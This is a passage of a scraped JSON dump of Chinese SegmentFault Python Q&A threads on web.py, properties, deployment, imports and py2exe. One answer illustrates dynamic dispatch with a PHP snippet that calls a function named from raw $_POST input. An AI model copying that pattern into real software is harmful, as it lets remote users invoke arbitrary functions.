      "dsc": "<div class=\"question fmt\" data-id=\"1010000000095216\">\n<html><body>\n<p>py文件如下：</p>\n<pre>#!C:\\Python26\\python.exe\n#coding:utf-8\nimport web\nweb.config.debug = True\n        \nurls = (\n    '/.*', 'hello'\n)\napp = web.application(urls, globals())\nrender_test=web.template.render('templates/')\n\nclass hello:        \n    def GET(self):\n        return render_test.test(\"\")\n    def POST(self):\n        query = web.input()\n        return render_test.test(query.content)\n\nif __name__ == \"__main__\":\n    app.run()</pre>\n<p>模版文件：</p>\n<pre>$def with(content)\n&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"&gt;\n&lt;html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\"&gt;\n&lt;head&gt;\n\t&lt;meta http-equiv=\"Content-Type\" content=\"text/html;charset=UTF-8\" /&gt;\n\t&lt;title&gt;test&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n\t&lt;form action=\"\" method=\"post\"&gt;\n\t\t&lt;textarea name=\"content\" id=\"\" cols=\"30\" rows=\"10\"&gt;$content&lt;/textarea&gt;\n\t\t&lt;input type=\"submit\" value=\"post\" /&gt;\n\t&lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;</pre>\n<p><img data-src=\"http://segmentfault.com/img/ex4BLC\"><br><img data-src=\"http://segmentfault.com/img/cDFTE6\"><br>\n以上大家看到的再现这个问题的小程序，我向当前页面提交一个两行的文本，提交后，这个换行就会成倍增加，一个变两个，两个会成四个，但这只是在apache中是这样（别的机子还没有测试过），但如果直接运行webpy自己的服务来显示页面则没有这个问题</br></img></br></img></p>\n<p><img data-src=\"http://segmentfault.com/img/dAJSiQ\"><br>\n上图为在apache中的运行的结果<br><img data-src=\"http://segmentfault.com/img/cLSBrV\"><br>\n上图为直接运行py文件的结果</br></img></br></br></img></p>\n<p>从两个图上看是有点区别的，但这个区别不知道说明什么问题？</p>\n<p>apache版本 2.0  设置如下：</p>\n<pre>Listen 8820\n&lt;VirtualHost   test.com&gt;\n\t&lt;Directory \"E:\\py\"&gt;\n\t\tAllowOverride All\n\t\tOptions FollowSymLinks\n\t\tOrder allow,deny\n\t\tAllow from all\n\t&lt;/Directory&gt;\n\t\n\tServerAdmin   hellolibo@gmail.com\n\tDocumentRoot   E:\\pyblog\n\tServerName   blog  \n\tErrorLog   logs/aa_log\n\tCustomLog   logs/aa-access_log   common  \n    LogLevel info\n&lt;/VirtualHost&gt;</pre>\n<p>.htaccess文件如下：</p>\n<pre>Options +ExecCGI \nAddHandler cgi-script .py\n\n&lt;IfModule mod_rewrite.c&gt;      \n  RewriteEngine on\n  RewriteBase /\n  RewriteRule ^static/(.*)$  static/$1 [L]\n  RewriteRule ^upfile/(.*)$  upfile/$1 [L]\n  RewriteCond %{REQUEST_URI} !^(/.*)+t.py/\n  RewriteRule ^(.*)$ t.py/$1 [PT]\n&lt;/IfModule&gt;</pre>\n<p>------------------------------------------------------------------------------------------<br>\n现在我如果把接收到的数据做如下操作：<br/></br></p>\n<pre>query.content.replace(\"\\n\",\"\")</pre>\n<br>\n或者<br><pre>query.content.replace(\"\\r\",\"\")</pre>\n<br>\n都可以避免之前的情况</br></br></br></body></html>\n</div>",
      "favourite": "0",
      "glance": "3.3k",
      "tags": [
        "python",
        "apache",
        "web.py"
      ],
      "time": "2011-12-04",
      "title": "webpy项目中一个换行符无故自动翻倍的问题",
      "url": "https://segmentfault.com/q/1010000000095216"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000142542\">\n<p>要不你就运算好了以后直接赋值</p><p>要不你就写一个setAttr(value)方法, 因为是方法, 意味着可能存在其他运算, 提醒其他人这里可能有magic.<br/>\n同理可以写getAttr()方法.</p><p>本来是一个方法, 你也确确实实写了方法, 硬要假装自己是attrbute, 何苦呢?</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000142622\">\n<p>关于同时更新多个值的问题。</p><p>Java Bean 中绝大多数情况，都是一个 setter getter 只负责一个属性，只有极少数的 setter 和 getter 才会有关联的操作，对于这部分属性，你大可以在 python 中写一个 setter 来处理。 见 <strong>@勇者天空</strong> 的回答  <a href=\"http://segmentfault.com/q/1010000000142528#a-1020000000142598\" rel=\"nofollow\" target=\"_blank\" title=\"http://segmentfault.com/q/10100000001...\">http://segmentfault.com/q/10100000001...</a></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000142598\">\n<p>可以看下python文档里property setter/getter相关部分</p><pre>import datetime, re\n\nDATE_PATTERN = re.compile('^\\d+\\-\\d+\\-\\d+$')\n\ndef str_to_date(date):\n    if isinstance(date, datetime.date):\n        return date\n    elif isinstance(date,str) and DATE_PATTERN.match(date):\n        return datetime.date(*map(int, date.split('-')))\n    raise TypeError\n\n\nclass Person(object):\n    def __init__(self, name, birthday):\n        self.name = name\n        self.birthday = birthday\n        \n    @property\n    def birthday(self):\n        return self._birthday\n    \n    @birthday.setter\n    def birthday(self, birthday):\n        self._birthday = str_to_date(birthday)\n    \n    @property\n    def age(self):\n        return datetime.date.today() - self.birthday\n    \n    \n    def __str__(self):\n        return '%s,%s(%s)'%(self.name,self.birthday, self.age)\n    \n\n\nperson = Person('Xiao Ming','1980-10-1')\n\nprint(person)\n \nperson.birthday = '1981-1-2'\n\nprint(person)\n\nperson.birthday = datetime.date(1979,12,12)\n\nprint(person)\n\nperson.birthday = '123456' # raise TypeError</pre>\n</div>",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000142528\">\n<p>我看到一个文章(<a href=\"http://blog.renren.com/share/221095059/642703733\" rel=\"nofollow\" target=\"_blank\" title=\"http://blog.renren.com/share/22109505...\">http://blog.renren.com/share/22109505...</a>)</p><blockquote>Getter和setter是坏蛋。坏蛋，魔 鬼！Python对象不是Java Bean。不要写什么getter和setter，然后还把它们包装在“属性”里面。它直到你能证明你需要比一个简单访问复杂一点的功能时才有意义，否 则，不要写getter和setter。它们是CPU时间的浪费，更要紧的是，它们还是程序员宝贵时间的极大浪费。不仅仅对于写代码和测试的人，对于那些 要阅读和理解它们的人也是。<br/><br/>在 Java中，你必须使用getter和setter因为公共字段不允许你以后改变想法再去使用getter和setter。在Python中，这样做很 傻，因为你可以以一个普通特性开始并可以在任何时间改变你的想法，而不用影响到这个类的任何客户。所以不要写getter和setter。</blockquote><p>但是当我想设置对象的一个属性时,是用obj.attr=value这样直接赋值么?<br/>\n但是当我赋值某一个属性attr1时,其他有些关联属性attr2是应该可以自动生成的(通过对attr1的一些操作得到attr2应有的值),如果有setter,那么这个运算的过程可以写在setter里,如果不用setter那这个运算应该在哪里写呢?</p><p>谢谢</p>\n</div>",
      "favourite": "3",
      "glance": "7.4k",
      "tags": [
        "python",
        "oo"
      ],
      "time": "2012-11-20",
      "title": "python中不用getter和setter?",
      "url": "https://segmentfault.com/q/1010000000142528"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000148373\">\n<p>我再加一个。嘻嘻</p><p>Python中链表去重复的快速的方式：</p><pre>{}.fromkeys(mylist,0).keys()</pre>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000147030\">\n<pre>int_list = [1, 2, 3, 4]\n\nif 2 in int_list:\n   print \"fatastic!\"</pre><pre>import traceback\ndef asdf():\n    (filename,line_number,function_name,text)=traceback.extract_stack()[-1]\n    print function_name\nasdf()</pre><p>再加一个纯python的模块pexpect吧，这个东西挺好的。</p><pre>#!/usr/bin/python\n\nimport sys\nimport pexpect\n\npassword = 'password'\nexpect_list = ['(yes/no)', 'password:']\n\np = pexpect.spawn('ssh username@localhost ls')\ntry:\n    while True:\n        idx = p.expect(expect_list)\n        print p.before + expect_list[idx],\n        if idx == 0:\n            print \"enter yes\"\n            p.sendline('yes')\n        elif idx == 1:\n            print \"enter password\"\n            p.sendline(password)\nexcept pexpect.TIMEOUT:\n    print &gt;&gt;sys.stderr, 'timeout'\nexcept pexpect.EOF:\n    print p.before</pre>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000147413\">\n<p>这个问题不好答啊…自己觉得好的技巧，其他人可能非常常用…加上python本来就对问题解法相对单一…</p><p>三目运算符<br/>\n<code>a = True if k in l else False</code></p><p>List Comprehension<br/>\n<code>a = [ x for x in l if x &gt; 0]</code></p><p><code>property</code> decorator</p><pre>class A:\n    def __init__(self, name=None):\n        self._name = name\n    @property\n    def name(self):\n        return str(len(self._name)) + self._name\n\na = A(\"test\")\nprint(a.name)</pre><p>再补充一个从2.4到3.3都支持的<code>exception</code>捕捉方法，看有没有人需要，灵感来自@felix21的例子</p><pre>import sys\ntry:\n    ...\nexcept Exception:\n    t, e = sys.exc_info()[:2]\n    print(e)</pre>\n</div>",
      "attention": "6",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000146967\">\n<p>Python是十分优美的~~</p><p>我想收集些Python语言的技巧。</p><p>我先来:</p><p>unzip函数的实现 :</p><pre>zip(*a)</pre><ins><em>12.03追加 </em></ins><p>我再追加一个</p><pre>&gt;&gt;&gt; a=[[1,2,3],[4,5,6],[7,8,9]]\n&gt;&gt;&gt; sum(sum(a,[]))\n45</pre>\n</div>",
      "favourite": "15",
      "glance": "2.6k",
      "tags": [
        "python"
      ],
      "time": "2012-12-01",
      "title": "python技巧征集贴",
      "url": "https://segmentfault.com/q/1010000000146967"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000178403\">\n<p>使用：socket.io</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000178437\">\n<p>Python的话可以使用Tornado，用Long Polling的方式做。如果要支持Comet的话，可以使用CometD。具体用法google吧。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000178417\">\n<p>Node.js+socket.io很容易实现<br/>\n可参考 <a href=\"http://socket.io\" rel=\"nofollow\" target=\"_blank\" title=\"http://socket.io\">http://socket.io</a> 上面的例子</p><p>忘了看你的语言环境，socket.io有基于python的实现：<a href=\"https://github.com/MrJoes/tornadio2\" rel=\"nofollow\" target=\"_blank\" title=\"https://github.com/MrJoes/tornadio2\">https://github.com/MrJoes/tornadio2</a> ，<a href=\"https://github.com/abourget/gevent-socketio\" rel=\"nofollow\" target=\"_blank\" title=\"https://github.com/abourget/gevent-so...\">https://github.com/abourget/gevent-so...</a><br/>\n还有python有很多异步框架也能实现，比如：Twisted <a href=\"http://twistedmatrix.com/trac/\" rel=\"nofollow\" target=\"_blank\" title=\"http://twistedmatrix.com/trac/\">http://twistedmatrix.com/trac/</a></p>\n</div>",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000178392\">\n<p>举例：我们三个人参加一个对话，每次这个对话进行更新的时候如何通知其他用户？语言环境是python，数据库是redis。用的是Flask框架。</p>\n</div>",
      "favourite": "22",
      "glance": "6k",
      "tags": [
        "通知系统",
        "python",
        "redis",
        "flask"
      ],
      "time": "2013-03-13",
      "title": "如何实现一个即时的消息系统",
      "url": "https://segmentfault.com/q/1010000000178392"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000482311\">\n<p>随便 google 一下就一堆的东西就不多说了，来说一个比较偏门但非常方便的东西，就是 <a href=\"https://www.phusionpassenger.com/\" rel=\"nofollow\">passenger</a>。<br>\n跟很多人聊到这个的时候，大家普遍有误解，以为这个是 ruby 专用的，其实 passenger 是适用于 python、ruby 和 nodejs 的。<br>\npassenger 的安装需要重新编译 nginx，配置起来也相当容易，不需要额外的 supervisor 或 circus 等服务</br></br></p>\n<pre><code>root /path/to/app/public;\npassenger_python /path/to/app/venv/bin/python;\npassenger_enabled on;\n</code></pre>\n<p>具体配置参考官方文档，相信不会让你失望。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000191945\">\n<p>Nginx + uWSGI</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000191919\">\n<h3>引自 - <a href=\"http://lutaf.com/141.htm\" rel=\"nofollow\">全面解读python web 程序的9种部署方式</a></h3>\n<p>python有很多web 开发框架，代码写完了，部署上线是个大事，通常来说，web应用一般是三层结构\nweb server ----&gt;application -----&gt; DB server</p>\n<ul>\n<li>主流的web server 一个巴掌就能数出来，apache，lighttpd，nginx，iis</li>\n<li>application,中文名叫做应用服务，就是你基于某个web framework写的应用代码</li>\n<li>DB server 泛指存储服务，web开发中用mysql比较多，最近几年因为网站规模扩大，memcache，redis这种key-value等存储也流行开来</li>\n</ul>\n<p>放在最前面的web server有3个功能</p>\n<ol>\n<li>高效率处理静态文件,web server都是用c开发，调用是native的函数，对IO，文件传输都做针对性的优化</li>\n<li>充当一个简易的网络防火墙，可以denny一些ip，简单的控制并发连接数量等等，聊胜于无</li>\n<li>处理高并发短连接请求，把成千上万用户的request 通过内网的几十个长连接进行转发，原因一个是web server处理高并发很专业，另外一个原因是大部分的application所用的框架都不具备处理高并发的能力</li>\n</ol>\n<p>实际上，市面上有部分web framework由于内置了支持epoll/kqueue 等高效网络库，而具备了处理高并发的能力，比如说 python的tornado，java系的tomcat,jetty等等，有人就去掉前端的web server，直接裸奔，但是在部署公网应用时候，最好别这样做，因为前面提到的1,2两个原因，用户brower到web server的网络状况是千奇百怪，你无法想象的，\nweb server 强烈建议使用nginx，原因有三</p>\n<ol>\n<li>性能非常卓越，非常稳定</li>\n<li>安装简单，依赖包少</li>\n<li>conf文件非常容易配置，比apache/lighttpd都要简单</li>\n</ol>\n<h3>部署python开发的web程序有9种方法</h3>\n<ul>\n<li>\nmod<em>python,这是apache内置的模块，很严重的依赖于mod</em>python编译使用的python版本，和apache配套使用，不推荐</li>\n<li>\ncgi，这个太old，不推荐，而且nginx不支持cgi方式，只能用lighttpd或者apache</li>\n<li>\nfastcgi ，这个是目前流行最广的做法，通过flup模块来支持的，在nginx里对应的配置指令是 fastcgi_pass</li>\n<li>\nspawn-fcgi，这个是fastcgi多进程管理程序，lighttpd安装包附带的，和flup效果一样，区别是flup是 python代码级引入，spawn-fcgi是外部程序。spawn-fcgi用途很广，可以支持任意语言开发的代码，php,python,perl,只要你代码实现了fastcgi接口，它都可以帮你管理你的进程</li>\n<li>\nscgi,全名是Simple Common Gateway Interface，也是cgi的替代版本，scgi协议很简单,我觉得和fastcgi差不多，只是没有怎么推广开来，nginx对应的配置指令是scgi_pass，你想用就用，flup也支持。</li>\n<li>\nhttp，nginx使用proxy_pass转发,这个要求后端appplication必须内置一个能处理高并发的http server，在python的web框架当中，只能选择tornado.\npython程序员喜欢发明轮子，tornado除了是一个web framework之外，它还可以单独提供高性能http server，所以，如果你采用其他python框架写代码，比如说bottle，也一样可以通过import tornado 来启动一个高性能的http server，同样的可以采用http协议和nginx一起来部署。扩展开来，python包里面能处理高并发的http server还有很多，比如说gevent，也可以被其他框架引用来支持http方式部署。\n现实当中，用java来做web程序，通常就用http和nginx配合，应用服务器选择tomcat或者jetty</li>\n<li>\nuwsgi,包括4部分组成，\n\n<ul>\n<li>uwsgi协议</li>\n<li>web server内置支持协议模块</li>\n<li>application服务器协议支持模块</li>\n<li>进程控制程序\nnginx从0.8.4开始内置支持uwsgi协议，uwsgi协议非常简单，一个4个字节header+一个body，body可以是很多协议的包，比如说http，cgi等（通过header里面字段标示），我曾经做个一个小规模的性能对比测试，结果表明，uwsgi和fastcgi相比，性能没有太明显的优势,也可能是数据集较小的原因</li>\n</ul></li>\n</ul>\n<p>uwsgi的特点在于自带的进程控制程序.它是用c语言编写，使用natvie函数，其实和spawn-fcgi/php-fpm类似。所以uwsgi可以支持多种应用框架，包括(python,lua,ruby,erlang,go)等等\n   * \nGunicorn,和uwsgi类似的工具，从rails的部署工具(Unicorn)移植过来的。但是它使用的协议是 WSGI，全称是Python Web Server Gateway Interface ，这是python2.5时定义的官方标准(PEP 333 )，根红苗正，而且部署比较简单，<a href=\"http://gunicorn.org/\" rel=\"nofollow\">http://gunicorn.org/</a> 上有详细教程\n   * \nmod_wsgi,apache的一个module，也是支持WSGI协议,<a href=\"https://code.google.com/p/modwsgi/\" rel=\"nofollow\">https://code.google.com/p/modwsgi/</a></p>\n<h3>fastcgi协议和http协议在代码部署中的的优劣对比</h3>\n<ul>\n<li>\nfastcgi虽然是二进制协议，相对于http协议，并不节省资源。二进制协议，只能节省数字的表达，比如 1234567，用字符串表示需要7个Byte，用数字就是4个Byte，而字符串到哪里都一样</li>\n<li>\nfastcgi在传输数据的时候，为了兼容cgi协议，还要带上一堆cgi的环境变量，所以和http协议相比，用fastcgi传输数据并不省，反而多一些</li>\n<li>\nfastcgi 唯一的优点是，它是长连接的，用户并发1000个request，fastcgi可能就用10个 链接转发给后端的appplication，如果用http协议，那来多少给多少，会向后端appplication 发起1000个请求</li>\n<li>\nhttp代理转发方式，在面对超高并发的情况下会出问题，因为，tcp协议栈当中，port是int16整型 你本地新建一个connect，需要消耗一个端口，最多能到65536。外部并发几十万个请求，port池耗干，你的服务器只能拒绝响应了</li>\n</ul>\n<h3>总结</h3>\n<p>我个人习惯是用 fastcgi 协议部署python程序，简单省事，选择技术方案，一定要选择最简单最常见的，本博客的fastcgi运行脚本如下</p>\n<pre><code>  1. kill -9 `cat /tmp/django.pid`\n\n  2. echo 'restart django....'\n\n  3. python ./manage.py runfcgi --settings=lutaf.settings_r maxchildren=8  maxspare=3 minspare=1 method=prefork  pidfile=/tmp/django.pid host=127.0.0.1 port=9900 outlog=/tmp/dj.out errlog=/tmp/dj.error\n</code></pre>\n<p>推荐大家尝试 Gunicorn ，这是未来发展方向</p>\n</div>",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000191900\">\n<p>我是php出身，在学python，对于python的部署感到很蛋疼..因为php部署可能比较方便，\n一个php-fpm跑着就可以了。\n我知道uwsgi，gunicorn这些，gunicorn相对容易一点，uwsgi相对蛋疼一些。</p>\n<p>另外我网上看到uwsgi可以配置vhost，就是多个站点跑一个进程端口，和php-fpm一样，\n不过听说python这样部署不是最好的，还是one for app最好？</p>\n</div>",
      "favourite": "27",
      "glance": "5.2k",
      "tags": [
        "python"
      ],
      "time": "2013-04-22",
      "title": "Python有哪些常用的部署方式？",
      "url": "https://segmentfault.com/q/1010000000191900"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000202321\">\n<p>如题，virtualenv的python版本是2.7，现在装了2.7.4，如何将virtualenv里的版本也更新到2.7.4呢？</p>\n<p>如果是2.6，那么这种跨大版本的又该如何升级到2.7呢？</p>\n</div>",
      "favourite": "2",
      "glance": "3.1k",
      "tags": [
        "python",
        "virtualenv"
      ],
      "time": "2013-05-18",
      "title": "python升级后，如何给virtualenv里的python进行升级",
      "url": "https://segmentfault.com/q/1010000000202321"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000247496\">\n<p>所谓「模拟」，最好是尽可能接近或直接使用线上环境，比较典型的例子是：早期微信如果xml  response组织有误，会直接显示出来xml，现在不会了，自己写的模拟器你怎么操作？</p>\n<p>我现在的办法楼主可以借鉴一下（适用于开发环境），需要有三个前提：</p>\n<p>方法一：</p>\n<ol>\n<li>本地热部署环境（废话，PHP版本&gt; 5.4直接：php -S 0.0.0.0:80 、 Python: python -m SimpleHTTPServer）</li>\n<li>外网IP要有一个（这个如果是ADSL的话，自动IP也没那么快切换，大概几小时或者重启路由一次吧） </li>\n<li>有一个二级测试域名或一级域名</li>\n</ol>\n<p>附加：开发环境还是专门申请一个公号为好，特别是大的应用</p>\n<p>接下来重点来了：</p>\n<ol>\n<li>微信后台的URL写一个域名地址，例如：<a href=\"http://test.domain.com/index.php\" rel=\"nofollow\">http://test.domain.com/index.php</a></li>\n<li>将此域名绑定至DNSPod (也可以是其他解析)</li>\n<li>直接修改DNSPod的MX纪录，把所有请求解析至本地</li>\n</ol>\n<p>这是一个参考办法，楼主可以留意一下。</p>\n<p>方法二：\n1、在正式环境的nginx（假如是），设置一个proxy_pass到本机</p>\n<p>以上两种都是我以前用过的办法，最早时是跟楼主一下，如果是使用github的话，还可以使用hook功能直接pull到服务器，后来用了第一种，修改域名解析的办法来干的。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000246904\">\n<p>又发现一个本地测试，不过没有用，用的是楼上的~<a href=\"https://github.com/ushuz/weixin-simulator\" rel=\"nofollow\">https://github.com/ushuz/weixin-simulator</a></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000236175\">\n<p><a href=\"http://www.weibo.com/1619523880/zAn49gf9f\" rel=\"nofollow\">小宏_Red</a></p>\n<p>有一个开源项目，用于微信公众平台应用的本地化测试，项目地址<a href=\"https://github.com/xred/WeTest\" rel=\"nofollow\">https://github.com/xred/WeTest</a>\n在api地址里填入你的微信项目的请求地址，可以是在服务器上，也可以是localhost上，然后在输入内容里打入要发的内容，上面的框框右半部分会显示返回的内容</p>\n</div>",
      "attention": "11",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000236126\">\n<p>使用Python,flask处理后端。</p>\n<p>每次在本地写好代码，push 到github，ssh 到服务器，pull下来代码，运行测试，感觉很不方便，有没有方法什么可以在本地测试的？</p>\n<p>可不可以有方法实现在本地直接输入要进行测试的信息，像web开发一样，写好网页在本地运行，输入需要post的请求，看返回结果是否正确。</p>\n<p>求大神指导~</p>\n</div>",
      "favourite": "12",
      "glance": "41.6k",
      "tags": [
        "android",
        "测试",
        "python",
        "微信"
      ],
      "time": "2013-06-18",
      "title": "微信公众平台如何实现本地测试？",
      "url": "https://segmentfault.com/q/1010000000236126"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000263261\">\n<p><del>因为<code>a.py</code>在test包内，你只要 <code>from b import c</code> 就行了。</del>\n作者用的python3，与2不同，参考楼上的答案吧。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000004408432\">\n<p>python3的话，这种情况，直接在a.py里写：<br>import b<br>就可以了~</br></br></p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000263273\">\n<p>你的 test 的上级目录不在 <code>sys.path</code> 中。</p>\n<p>还有，不要直接执行一个包里边的文件。如果真需要执行一个包里的模块（而又不使用 distribute 提供的 entry point 安装配置），请使用 <code>python3 -m test.a</code> 这样子。</p>\n</div>",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000263255\">\n<p>比如说</p>\n<pre><code>test\n|-- a.py\n|-- b.py\n`-- __init__.py\n</code></pre>\n<p><code>a.py</code></p>\n<pre><code>from test.b import c\nprint(c)\n</code></pre>\n<p><code>b.py</code></p>\n<pre><code>c = \"test\"\n</code></pre>\n<p>运行 <code>a.py</code></p>\n<pre><code>python3 a.py\n</code></pre>\n<p>出错</p>\n<blockquote>\n<p>Traceback (most recent call last):</p>\n<p>File \"a.py\", line 1, in <module></module></p>\n<pre><code>from test.b import c\n</code></pre>\n<p>ImportError: No module named 'test.b'</p>\n</blockquote>\n<p>我是看官方文档的： <a href=\"https://docspy3zh.readthedocs.org/en/latest/tutorial/modules.html#tut-packages\" rel=\"nofollow\">https://docspy3zh.readthedocs.org/en/latest/tutorial/modules.html#tut-packages</a></p>\n<p>为什么<code>test</code>没有被当成一个包呢？脚本所在的文件夹应该在搜索路径里面的呀。</p>\n<p>虽然直接import 也行，但是用包组织似乎更推荐？</p>\n<p>如果说因为是包内平级的模块不行，但是文档里面说可以用语句来导入的： \n<a href=\"https://docspy3zh.readthedocs.org/en/latest/tutorial/modules.html#id18\" rel=\"nofollow\">https://docspy3zh.readthedocs.org/en/latest/tutorial/modules.html#id18</a></p>\n<p>然而将<code>a.py</code>改成：</p>\n<pre><code>from . import b\nprint(b.c)\n</code></pre>\n<p>依然报错。</p>\n<blockquote>\n<p>Traceback (most recent call last):</p>\n<p>File \"a.py\", line 1, in <module></module></p>\n<pre><code>from . import b\n</code></pre>\n<p>SystemError: Parent module '' not loaded, cannot perform relative import</p>\n</blockquote>\n<p>将 a.py 改写成</p>\n<pre><code>import sys\nprint(sys.path)\n</code></pre>\n<p>输出：</p>\n<pre><code>['/home/tioover/.proj/test', '/usr/lib/python3.3/site-packages/Pectin-0.9-py3.3.egg', '/usr/lib/python33.zip', '/usr/lib/python3.3', '/usr/lib/python3.3/plat-linux', '/usr/lib/python3.3/lib-dynload', '/usr/lib/python3.3/site-packages', '/usr/lib/python3.3/site-packages/setuptools-0.6c11.egg-info']\n</code></pre>\n</div>",
      "favourite": "3",
      "glance": "8.5k",
      "tags": [
        "python"
      ],
      "time": "2013-08-10",
      "title": "Python 包导入错误",
      "url": "https://segmentfault.com/q/1010000000263255"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000343918\">\n<p>解释器会先扫描整个文件，找语法错的，扫描一遍函数名不就都知道了嘛</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000343950\">\n<p>关于Ruby的链接打不开。python不了解。关于ruby提供一个简单的例子。</p>\n<pre><code class=\"lang-ruby\">lambda { \n    def fun1\n        puts 'fun1'\n        fun2\n    end\n\n    def fun2\n        puts 'fun2'\n    end\n\n    fun1\n}.call\n#运行结果\n#fun1\n#fun2\n</code></pre>\n<p>但是如果再定义fun2之前调用fun2</p>\n<pre><code class=\"lang-ruby\">lambda { \n    def fun1\n        puts 'fun1'\n        fun2\n    end\n    fun1\n    def fun2\n        puts 'fun2'\n    end\n\n}.call\n</code></pre>\n<p>会给出如下错误<br/>\n<code>fun1': undefined local variable or method</code>fun2' for main:Object (NameError)<br/>\n而且根据提示的行数，是再调用fun1的时候出错的。也就是说ruby是再定义方法的时候并不会去检查变量是不是真正存在，只有在运行fun1时才会去真正执行这段代码。这也是动态语言的特性。也只有这样，也才能保证随时可以重新打开方法，重写方法。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000343736\">\n<p>不需要中间文件，func1, func2的定义保存在内存中即可。</p>\n<p>以PHP为例，在内存里有一个HashTable，专门用于保存user difined function，当PHP Engine解析（Parse）到function func2()时，就往这个HashTable里插入一条记录，Key是func2，Value是func2的内存指针地址等信息。</p>\n<p>当func1.php调用（Call）func2时，PHP Engine就去这个HashTable里查找func2在不在，如果在就继续调用，如果不在就报错：call to undefined function func2.</p>\n<p>这和编译型语言不一样，编译型语言是在编译阶段（Compiling）就会判断func2在不在，如果func2不存在，编译器就会报错。而动态语言（解释性语言）是到了运行阶段（runtime）才会报错的。之所以存在这样的区别，是为了达到动态语言所谓的动态灵活性，func2可能并不是在hard code中写死的一个函数名，而是一个变量（比如根据if else算出来的、End User通过HTTP传过来的，等等），例如：</p>\n<pre><code>&lt;?php\n$funcName = $_POST[\"action\"] . \"Article\";//假设这里$_POST[\"action']=del\n$funcName(1001);//则这里实际调了delArticle(1001)\n</code></pre>\n<p>那么存在中间文件的意义是什么呢，中间文件可以把一些语法解析的结果缓存起来，下次执行的时候，如果源代码没有改动，就直接执行中间文件里的缓存指令了，这样可以极大地提升性能。</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000343689\">\n<p>今天看到了<a href=\"http://blogruby.blogspot.com/2008/10/10ruby.html\" rel=\"nofollow\">这个</a>，上面说ruby这种动态脚本式从代码的第一行开始顺序执行的，然后又想到了python，所以又看到了<a href=\"http://wwty.iteye.com/blog/649171\" rel=\"nofollow\">这篇</a>，然后心生了疑问，python和ruby中如果要在当前的函数中调用其他的函数的话<br/>\n* 当前函数的名字为func1<br/>\n* 被调用的函数的名字为func2</p>\n<p>那么func2可以定义在func1之前也可以定义在func1之后，那按照第一篇博文中说的顺序执行，那如果func2定义在func1之后的话当执行func1的时候就不是找不到func2的定义了么，像python的话还会生成一个中间的pyc或者pyo还可以理解，可是ruby在解释的时候没有生成任何的中间文件，ruby虚拟机是如何做到寻找之前没有执行过的函数的，也就是在func2定义在func1之后的时候python和ruby是如何做到在func1中执行func2而不出错的</p>\n</div>",
      "favourite": "1",
      "glance": "2k",
      "tags": [
        "python",
        "ruby"
      ],
      "time": "2013-11-25",
      "title": "关于动态语言运行机制的一些疑问",
      "url": "https://segmentfault.com/q/1010000000343689"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000392383\">\n<p>放在cmd里或者powershell里，敲编译出来的exe文件名字运行</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000403452\">\n<p>换pyinstaller试试</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000413781\">\n<pre><code class=\"lang-python\">import sys\ntry:\n    put all your code here\nexcept:\n    print \"Unexpected error:\", sys.exc_info() # sys.exc_info()返回出错信息\n    raw_input('press enter key to exit') #这儿放一个等待输入是为了不让程序退出\n</code></pre>\n<p>这样exe运行时如果出错程序也不会直接退出，而是显示错误信息。</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000380675\">\n<p>使用Pycharm执行python代码的时候没出息问题，但是使用py2exe打包成exe运行后，执行过程一闪而过。<br/>\n不知道从何排查起~<br/>\n不知道有没有谁有过相关的处理经验呢？</p>\n</div>",
      "favourite": "1",
      "glance": "5.3k",
      "tags": [
        "python"
      ],
      "time": "2014-01-08",
      "title": "Python：py2exe打包后，执行时候一闪而过然后退出",
      "url": "https://segmentfault.com/q/1010000000380675"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000603049\">\n<p>内容只需一个string field，这个string里你可以存JSON，可以存XML，可以存YAML，甚至可以存一个Java class……<br>\n反正就是想要什么你都可以放进去的意思。</br></p>\n</div>",
